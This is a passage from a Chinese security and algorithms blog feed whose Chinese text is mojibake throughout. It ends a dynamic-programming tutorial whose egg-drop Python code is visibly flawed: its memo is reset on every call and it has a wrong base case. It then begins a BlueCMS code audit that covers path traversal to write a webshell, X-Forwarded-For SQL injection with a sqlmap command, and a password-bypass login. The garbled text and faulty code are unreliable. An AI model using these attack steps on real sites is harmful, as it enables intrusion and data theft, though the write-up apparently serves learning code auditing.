punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="DP-tableè§£æ³•-2"><a href="#DP-tableè§£æ³•-2" class="headerlink" title="DP tableè§£æ³•"></a>DP tableè§£æ³•</h4><p>è‡ªåº•å‘ä¸Š</p><p>é¦–å…ˆç¡®å®š<code>dp</code>æ•°ç»„çš„å«ä¹‰ï¼Œ<code>dp</code>æ•°ç»„æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170423923.png" alt loading="lazy"></p><p><code>dp[i][j]</code>å­˜å‚¨ç€<code>s1[i]</code>å’Œ<code>s2[j]</code>çš„æœ€å°ç¼–è¾‘è·ç¦»ï¼Œå„ç›¸é‚»çš„æ•°æ®ä¹‹é—´æœ‰å¦‚ä¸‹å…³ç³»ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170651675.png" alt loading="lazy"></p><p>äºæ˜¯å°±å¯ä»¥å†™å‡ºä»¥ä¸‹ä»£ç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>    dp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>éšåè¿˜å¯ä»¥å°†æ­¥éª¤æ¨å‡ºæ¥ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>    dp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># è®°å½•æ¯ä¸€æ­¥çš„æ“ä½œ 0ï¼šå•¥éƒ½ä¸åšï¼Œ1ï¼šæ’å…¥ï¼Œ2ï¼šæ›¿æ¢ï¼Œ3ï¼šåˆ é™¤</span>    dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    a<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i        a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i        a<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># ä¸åŠ¨ï¼Œä¹Ÿå°±æ˜¯ç›¸åŒç›´æ¥è·³è¿‡ 0</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># æ’å…¥ 1</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># æ›¿æ¢ 2</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ é™¤ 3</span>            <span class="token keyword">if</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">elif</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>            <span class="token keyword">elif</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ä»¥ä¸Šä»£ç å°†è¾“å‡ºï¼š</p><pre class="language-none"><code class="language-none">0333331033331122221112224</code></pre><p>ä»åé¢å¾€å‰æ¨å°±è¡Œï¼Œ0,2ä»£è¡¨å¯¹è§’ï¼ˆè·³è¿‡/æ›¿æ¢ï¼‰ï¼Œ1ä»£è¡¨å‘ä¸Šï¼ˆæ’å…¥ï¼‰ï¼Œ3ä»£è¡¨å‘å·¦ï¼ˆåˆ é™¤ï¼‰</p><p>å¯»æ‰¾åˆ°0çš„æœ€ä½³æ·å¾„å°±OK</p><h3 id="é«˜æ¥¼æ‰”é¸¡è›‹"><a href="#é«˜æ¥¼æ‰”é¸¡è›‹" class="headerlink" title="é«˜æ¥¼æ‰”é¸¡è›‹"></a>é«˜æ¥¼æ‰”é¸¡è›‹</h3><p>é¢˜ç›®ï¼š</p><p>ç›®å‰æœ‰ä¸€æ ‹1åˆ°<code>N</code>å…±<code>N</code>å±‚çš„æ¥¼ï¼Œç„¶åç»™ä½ <code>K</code>é¸¡è›‹ï¼ˆ<code>K</code>è‡³å°‘ä¸º1ï¼‰ï¼Œç°åœ¨ç¡®å®šè¿™æ ‹æ¥¼å­˜åœ¨æ¥¼å±‚<code>0&lt;=F&lt;=N</code>,åœ¨è¿™å±‚æ¥¼å°†é¸¡è›‹æ‰”ä¸‹å»é¸¡è›‹<strong>æ°å¥½æ²¡æœ‰ç¢</strong>ï¼ˆé«˜äº<code>F</code>çš„æ¥¼å±‚éƒ½ä¼šç¢ï¼Œä½äº<code>F</code>çš„æ¥¼å±‚éƒ½ä¸ä¼šç¢ï¼‰ï¼Œç°åœ¨é—®ï¼Œæœ€åçš„æƒ…å†µä¸‹ï¼Œä½ è‡³å°‘è¦æ‰”å¤šå°‘æ¬¡é¸¡è›‹ï¼Œæ‰èƒ½ç¡®å®šè¿™ä¸ªæ¥¼å±‚<code>F</code>ï¼Ÿ</p><h4 id="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•-3"><a href="#å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•-3" class="headerlink" title="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•"></a>å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Kä¸ªé¸¡è›‹,Nå±‚æ¥¼</span>    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> K <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> N    <span class="token keyword">if</span> N <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span>K <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> main<span class="token punctuation">(</span>K<span class="token punctuation">,</span> N <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># åœ¨maxæœ€åçš„æƒ…å†µä¸‹ï¼Œæ±‚minæœ€ä¼˜è§£ï¼Œmain(K - 1, i - 1)è¡¨ç¤ºç¢äº†ï¼Œmain(K, N - i)è¡¨ç¤ºæ²¡ç¢</span>    memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> res    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="äºŒåˆ†æ³•ä¼˜åŒ–"><a href="#äºŒåˆ†æ³•ä¼˜åŒ–" class="headerlink" title="äºŒåˆ†æ³•ä¼˜åŒ–"></a>äºŒåˆ†æ³•ä¼˜åŒ–</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Kä¸ªé¸¡è›‹,Nå±‚æ¥¼</span>    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> K <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> N    <span class="token keyword">if</span> N <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>    lo <span class="token operator">=</span> <span class="token number">1</span>    hi <span class="token operator">=</span> N    <span class="token keyword">while</span> lo <span class="token operator">&lt;=</span> hi<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>lo <span class="token operator">+</span> hi<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        broken <span class="token operator">=</span> main<span class="token punctuation">(</span>K <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># ç¢</span>        not_broken <span class="token operator">=</span> main<span class="token punctuation">(</span>K<span class="token punctuation">,</span> N <span class="token operator">-</span> mid<span class="token punctuation">)</span>  <span class="token comment"># æ²¡ç¢</span>        <span class="token comment"># res = min(max(ç¢, æ²¡ç¢) + 1)</span>        <span class="token keyword">if</span> broken <span class="token operator">></span> not_broken<span class="token punctuation">:</span>            hi <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> broken <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            lo <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> not_broken <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> res    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueCMSä»£ç å®¡è®¡</title>
      <link href="posts/b7c1e15e/"/>
      <url>posts/b7c1e15e/</url>
      
        <content type="html"><![CDATA[<p>â€œBlueCMSâ€”â€”ç¬¬ä¸€æ¬¾å…è´¹å¼€æºçš„ä¸“ä¸šåœ°æ–¹é—¨æˆ·ç³»ç»Ÿï¼Œä¸“æ³¨äºåœ°æ–¹é—¨æˆ·çš„CMSï¼â€  å¹¿å‘Šæ˜¯è¿™ä¹ˆæ‰“çš„</p><p>BlueCMS v1.6 sp1ï¼Œä¸€ä¸ªå¾ˆè€çš„CMSäº†ï¼Œ2010å¹´çš„ï¼Œä¸Šé¢çš„æ¼æ´ä¹Ÿå¾ˆå¤šï¼Œä½œä¸ºä¸€ä¸ªä»£ç å®¡è®¡èŒæ–°çš„æˆ‘ï¼Œå¼€å§‹æ¥æ‹¿è¿™ä¸ªç»ƒç»ƒæ‰‹è¿˜æ˜¯ä¸é”™çš„</p><span id="more"></span><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>åœ¨åå°æœ‰ä¸€ä¸ªæ¨¡æ¿ç®¡ç†çš„åŠŸèƒ½ï¼Œå¯ä»¥ç¼–è¾‘å‰ç«¯htmæ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101051793.png" alt loading="lazy"></p><p>ç‚¹å‡»ç¼–è¾‘æŠ“åŒ…</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101241645.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°åŒ…å«äº†æ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•ä¿®æ”¹ç¼–è¾‘çš„æ–‡ä»¶ï¼Œæ”¹ä¸º<code>../../ann.php</code>ï¼Œæ”¾åŒ…åå¦‚ä¸‹ï¼Œå¯ä»¥ä¿®æ”¹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101419641.png" alt loading="lazy"></p><p>éšåç›´æ¥å†™é©¬è¿æ¥å³å¯ï¼Œæºç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101729886.png" alt loading="lazy"></p><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><h4 id="X-Forwarded-Forå¤´æ³¨å…¥"><a href="#X-Forwarded-Forå¤´æ³¨å…¥" class="headerlink" title="X-Forwarded-Forå¤´æ³¨å…¥"></a>X-Forwarded-Forå¤´æ³¨å…¥</h4><p>é¦–å…ˆçœ‹åˆ°ç•™è¨€ç³»ç»Ÿåå°ä»£ç </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415164807809.png" alt loading="lazy"></p><p>ç½‘ç«™ä¹ æƒ¯æ€§çš„æŠŠç”¨æˆ·ç•™è¨€æ—¶çš„ipä¿å­˜ä¸‹æ¥ï¼Œåœ¨çœ‹çœ‹getip()è¿™ä¸ªå‡½æ•°æ€ä¹ˆå†™çš„</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165228100.png" alt loading="lazy"></p><p>getenv()å‡½æ•°è·å–ç¯å¢ƒå˜é‡çš„å€¼</p><ul><li>ç¬¬ä¸€ä¸ªHTTP_CLIENT_IPè¿™ä¸ªç¯å¢ƒå˜é‡æ²¡æœ‰æˆæ ‡å‡†ï¼Œå¾ˆå¤šæœåŠ¡å™¨å®Œå…¨æ²¡æ³•è·å–</li><li>ç¬¬äºŒä¸ªX-Forwarded-For è¿™ä¸ªä¸œè¥¿å¯ä»¥é€šè¿‡HTTPè¯·æ±‚å¤´æ¥ä¿®æ”¹ã€‚</li></ul><p>X-Forwarded-Foræ˜æ˜¾å¯ä»¥ä¼ªé€ </p><p>æŠ“åŒ…æ‰‹å·¥å»¶æ—¶æ³¨å…¥ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165848020.png" alt loading="lazy"></p><p>ç„¶åå†™è„šæœ¬è·‘å°±å¯ä»¥äº†</p><p>sqlmapè·‘æ•°æ®åº“ï¼š<code>python sqlmap.py -r 1.txt --dbs --batch --headers=&quot;X-Forwarded-For:1*&quot;</code></p><p>å¯ä»¥æŠŠæ•°æ®å…¨è·‘å‡ºæ¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415171800746.png" alt loading="lazy"></p><h4 id="é¦–é¡µç™»å½•ç•Œé¢SQLæ³¨å…¥"><a href="#é¦–é¡µç™»å½•ç•Œé¢SQLæ³¨å…¥" class="headerlink" title="é¦–é¡µç™»å½•ç•Œé¢SQLæ³¨å…¥"></a>é¦–é¡µç™»å½•ç•Œé¢SQLæ³¨å…¥</h4><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸ºrootçš„è´¦å·ï¼Œç„¶ååœ¨æŠ“åŒ…ä½¿ç”¨ä¸‡èƒ½å¯†ç å³å¯ç™»å½•ä»»æ„ç”¨æˆ·</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134357459.png" alt loading="lazy"></p><p>å†æ¥çœ‹çœ‹æºç ä¸­æ˜¯æ€ä¹ˆå†™çš„</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134551779.png" alt 